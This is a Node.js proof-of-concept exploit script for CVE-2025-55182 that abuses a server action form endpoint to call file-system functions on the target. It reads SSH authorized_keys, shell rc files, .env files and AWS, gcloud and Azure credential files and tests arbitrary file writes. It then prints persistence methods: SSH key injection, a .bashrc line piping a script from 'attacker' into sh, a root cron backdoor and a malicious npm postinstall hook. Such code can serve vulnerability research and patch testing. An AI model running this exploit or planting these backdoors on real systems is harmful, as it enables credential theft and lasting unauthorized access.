/**
 * CVE-2025-55182 - Persistence Attack (fs only, no vm/child_process needed)
 * 
 * Even with only fs module, we can achieve persistence via:
 * 1. SSH authorized_keys injection
 * 2. ~/.bashrc backdoor
 * 3. Cron job injection
 * 4. Overwrite app source code
 */

const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');

async function sendRequest(formFields) {
  const boundary = '----Boundary';
  const parts = [];
  for (const [name, value] of Object.entries(formFields)) {
    parts.push('--' + boundary + '\r\n' +
      'Content-Disposition: form-data; name="' + name + '"\r\n\r\n' +
      value + '\r\n');
  }
  parts.push('--' + boundary + '--\r\n');
  const body = parts.join('');

  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: 'localhost', port: 3002, path: '/formaction',
      method: 'POST',
      headers: {
        'Content-Type': 'multipart/form-data; boundary=' + boundary,
        'Content-Length': Buffer.byteLength(body)
      }
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, data }));
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

async function main() {
  console.log('=== CVE-2025-55182 - Persistence Attacks (fs-only) ===\n');
  
  const homeDir = os.homedir();
  console.log('Target home directory:', homeDir);
  
  // 1. Read existing SSH keys
  console.log('\n1. Reading existing SSH authorized_keys...');
  let result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'fs#readFileSync',
      bound: [path.join(homeDir, '.ssh/authorized_keys'), 'utf8']
    })
  });
  
  if (result.data.includes('ssh-')) {
    console.log('   ✓ Found existing SSH keys!');
    console.log('   First 100 chars:', result.data.slice(0, 100));
  } else if (result.data.includes('ENOENT')) {
    console.log('   No authorized_keys file exists');
  } else {
    console.log('   Result:', result.data.slice(0, 100));
  }
  
  // 2. Read .bashrc
  console.log('\n2. Reading .bashrc...');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'fs#readFileSync',
      bound: [path.join(homeDir, '.bashrc'), 'utf8']
    })
  });
  
  if (result.status === 200 && !result.data.includes('error')) {
    console.log('   ✓ Can read .bashrc');
    console.log('   Size:', JSON.parse(result.data).result.length, 'bytes');
  } else {
    console.log('   Result:', result.data.slice(0, 100));
  }
  
  // 3. Read .zshrc (macOS)
  console.log('\n3. Reading .zshrc...');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'fs#readFileSync',
      bound: [path.join(homeDir, '.zshrc'), 'utf8']
    })
  });
  
  if (result.status === 200 && !result.data.includes('error')) {
    console.log('   ✓ Can read .zshrc');
  }
  
  // 4. Read environment variables from .env
  console.log('\n4. Reading .env files...');
  for (const envPath of ['.env', '.env.local', '.env.production']) {
    result = await sendRequest({
      '$ACTION_REF_0': '',
      '$ACTION_0:0': JSON.stringify({
        id: 'fs#readFileSync',
        bound: [path.join(process.cwd(), envPath), 'utf8']
      })
    });
    if (result.status === 200 && !result.data.includes('ENOENT')) {
      console.log(`   ✓ Found ${envPath}!`);
    }
  }
  
  // 5. Read AWS/cloud credentials
  console.log('\n5. Reading cloud credentials...');
  const credPaths = [
    path.join(homeDir, '.aws/credentials'),
    path.join(homeDir, '.config/gcloud/credentials.db'),
    path.join(homeDir, '.azure/accessTokens.json'),
  ];
  
  for (const credPath of credPaths) {
    result = await sendRequest({
      '$ACTION_REF_0': '',
      '$ACTION_0:0': JSON.stringify({
        id: 'fs#readFileSync',
        bound: [credPath, 'utf8']
      })
    });
    if (result.status === 200 && !result.data.includes('ENOENT')) {
      console.log(`   ✓ Found ${credPath}!`);
    }
  }
  
  // 6. Demonstrate write capability (safe location)
  console.log('\n6. Testing write capability...');
  const testFile = '/tmp/cve-2025-55182-test.txt';
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'fs#writeFileSync',
      bound: [testFile, 'Persistence test - CVE-2025-55182']
    })
  });
  
  if (fs.existsSync(testFile)) {
    console.log('   ✓ Write successful:', fs.readFileSync(testFile, 'utf8'));
    fs.unlinkSync(testFile);
  }
  
  console.log('\n=== Persistence Attack Vectors (with fs only) ===\n');
  console.log('1. SSH Key Injection:');
  console.log('   fs.appendFileSync("~/.ssh/authorized_keys", "\\nssh-rsa ATTACKER_KEY...")');
  console.log('   → Immediate SSH access');
  console.log('');
  console.log('2. Shell RC Backdoor:');
  console.log('   fs.appendFileSync("~/.bashrc", "\\ncurl http://attacker/shell.sh | sh")');
  console.log('   → Executes on next shell login');
  console.log('');
  console.log('3. Cron Job:');
  console.log('   fs.writeFileSync("/etc/cron.d/backdoor", "* * * * * root curl...")');
  console.log('   → Executes every minute (requires root)');
  console.log('');
  console.log('4. Source Code Modification:');
  console.log('   Overwrite server.js, middleware, etc.');
  console.log('   → RCE on next restart/hot reload');
  console.log('');
  console.log('5. Package.json scripts:');
  console.log('   Add "postinstall": "curl... | sh" to package.json');
  console.log('   → Executes on next npm install');
}

main().catch(console.error);
